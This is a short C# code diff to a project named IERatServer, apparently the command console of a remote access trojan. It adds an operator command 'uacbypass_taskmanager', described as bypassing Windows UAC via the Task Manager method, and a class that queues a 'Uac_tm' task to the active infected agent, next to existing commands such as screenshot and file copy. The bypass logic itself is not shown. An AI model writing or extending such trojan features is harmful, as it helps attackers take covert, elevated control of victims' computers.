@@ -84,6 +84,9 @@ namespace IERatServer
             [Command(typeof(CopyCommand), Description = "Copy a file")]
             cp,
 
+            [Command(typeof(UacTmCommand), Description = "Bypass UAC using the Task Manager method")]
+            uacbypass_taskmanager,
+
             [Command(typeof(ExitCommand2), Description = "Exits the shell")]
             exit
         }
@@ -123,6 +126,14 @@ namespace IERatServer
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
                 AddTaskToActiveAgent("screenshot");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+        class UacTmCommand : Command
+        {
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AddTaskToActiveAgent("Uac_tm");
                 return Task.FromResult(CommandResult.Success);
             }
         }
